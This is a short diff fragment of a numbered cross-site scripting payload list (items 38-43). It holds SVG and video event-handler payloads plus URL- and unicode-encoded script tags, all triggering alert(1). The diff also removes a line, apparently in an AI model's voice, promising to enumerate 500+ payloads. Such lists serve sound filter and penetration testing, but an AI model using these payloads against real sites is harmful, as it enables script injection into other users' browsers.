@@ -38,8 +38,7 @@
 38. <svg><circle onmouseover=alert(1) r=40/></svg>
 39. <svg><foreignObject onload=alert(1)></foreignObject>
 40. <video><source onerror=alert(1)></video>
-...
-# I'll continue enumerating up to 500+:
+
 41. "%3Cscript%3Ealert(1)%3C/script%3E"
 42. \u003Cscript\u003Ealert(1)\u003C/script\u003E
 43. %3Cimg%20src=x%20onerror=alert(1)%3E
